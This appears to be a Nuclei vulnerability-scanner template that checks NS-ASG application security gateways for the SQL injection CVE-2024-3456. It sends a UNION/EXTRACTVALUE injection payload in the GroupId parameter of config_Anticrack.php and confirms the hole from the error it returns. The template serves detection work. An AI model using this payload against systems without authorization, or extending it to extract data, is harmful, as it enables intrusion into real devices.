id: cve-2024-3456
info:
  name: 网康科技NS-ASG应用安全网关 config_Anticrack.php SQL注入漏洞(CVE-2024-3456)
  author: ProjectDiscoveryAI
  severity: high
  tags: cve-2024-3456,sqli

variables:
  t1: "{{rand_int(1000, 9999)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/admin/config_Anticrack.php?GroupId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+md5({{t1}})),0x7e))"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "~{{t2}}~"
      - type: word
        words:
          - "XPATH syntax error"
